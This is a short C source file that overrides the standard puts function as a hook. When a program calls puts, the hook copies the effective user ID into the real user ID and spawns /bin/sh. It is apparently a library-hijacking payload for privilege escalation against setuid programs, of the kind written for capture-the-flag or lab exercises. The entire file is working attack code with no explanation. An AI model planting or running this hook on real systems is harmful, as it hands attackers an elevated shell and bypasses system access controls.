#include <stdio.h>
#include<unistd.h>

// Hooked puts function
int puts(const char *str) {

    setreuid(geteuid(), geteuid());

    char path[256] = "/bin/sh";
    char* argv[2];
    argv[0] = path;
    argv[1] = NULL;
    execv(path,argv);

    return 0;
}
